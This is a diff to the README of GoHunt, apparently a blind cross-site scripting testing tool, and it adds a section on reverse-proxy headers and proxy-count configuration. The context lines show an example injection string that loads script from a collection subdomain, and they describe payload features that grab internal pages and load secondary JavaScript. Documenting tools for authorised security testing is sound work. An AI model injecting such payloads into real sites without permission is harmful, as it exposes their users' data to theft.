@@ -48,7 +48,6 @@ docker compose -f docker-compose.yaml up -d
 
 Thats it!
 
-
 ## Summary of Functionality
 *Upon signing up you will create a subdomain such as `yoursubdomain.example.com` which identifies your XSS vulnerabilities and hosts your payload. You then use this subdomain in your XSS testing, using injection attempts such as `"><script src=//yoursubdomain.example.com></script>`. GoHunt will automatically serve up XSS probes and collect the resulting information when they fire.*
 
@@ -74,3 +73,11 @@ Thats it!
 * **Page Grabbing**: Upon your XSS payload firing you can specify a list of relative paths for the payload to automatically retrieve and store. This is useful in finding other vulnerabilities such as bad `crossdomain.xml` policies on internal systems which normally couldn't be accessed.
 * **Secondary Payload Loading**: Got a secondary payload that you want to load after GoHunt has done it's thing? GoHunt offers you the option to specify a secondary JavaScript payload to run after it's completed it's collection.
 * **Confidential Mode**: Dont want to send any details with your notifications? To be safe, this option only means you get notification and no details to your **slack**, **discord**, or email inbox
+
+## Advanced
+
+### Using alternative reverse proxies
+
+GoHunt requires the `X-Forwarded-Proto` and `X-Forwarded-For` headers if running behind a reverse proxy. 
+Caddy, by default sends these headers. 
+To parse `X-Forwarded-For` GoHunt also needs to be configured with how many proxies are in-front of your instance, so please set `number_proxies` in the yaml config, or the `NumberProxies` environment variable
